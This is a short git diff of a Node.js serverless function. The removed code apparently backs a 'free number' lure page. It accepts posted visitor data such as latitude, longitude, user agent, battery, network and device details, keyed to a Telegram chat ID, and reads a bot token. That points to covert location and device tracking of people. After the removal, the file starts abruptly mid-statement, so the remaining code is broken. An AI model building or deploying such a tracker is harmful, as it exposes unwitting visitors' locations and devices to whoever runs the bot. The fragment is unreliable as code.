@@ -1,48 +1,5 @@
 
-const fetch = require('node-fetch');
-const FormData = require('form-data');
-const formidable = require('formidable');
-
-module.exports = async (req, res) => {
-  const botToken = process.env.TOKEN;
-  const allowedOrigin = 'https://free-number1.vercel.app'; // <- دامنه‌ی خودت
-
-  // بررسی Origin
-  if (req.headers.origin && req.headers.origin !== allowedOrigin) {
-    return res.status(403).json({ ok: false, error: 'Invalid origin' });
-  }
-
-  if (req.method !== 'POST') {
-    return res.status(405).json({ ok: false, error: 'Method not allowed' });
-  }
-
-  const form = new formidable.IncomingForm();
-
-  form.parse(req, async (err, fields, files) => {
-    if (err) {
-      return res.status(500).json({ ok: false, error: 'Failed to parse form data.' });
-    }
-
-    const allowedFields = [
-      'chat_id', 'latitude', 'longitude', 'user_agent', 'timezone',
-      'battery_level', 'battery_charging', 'network_type', 'network_speed',
-      'ram', 'storage', 'country_code'
-    ];
-
-    for (const field in fields) {
-      if (!allowedFields.includes(field)) {
-        return res.status(400).json({ ok: false, error: 'Invalid input field: ' + field });
-      }
-    }
-
-    const {
-      chat_id: chatId,
-      latitude,
-      longitude,
-      user_agent: userAgent,
-      timezone,
-      battery_level: batteryLevel,
-      battery_charging: batteryCharging,
+batteryCharging,
       network_type: networkType,
       network_speed: networkSpeed,
       ram,
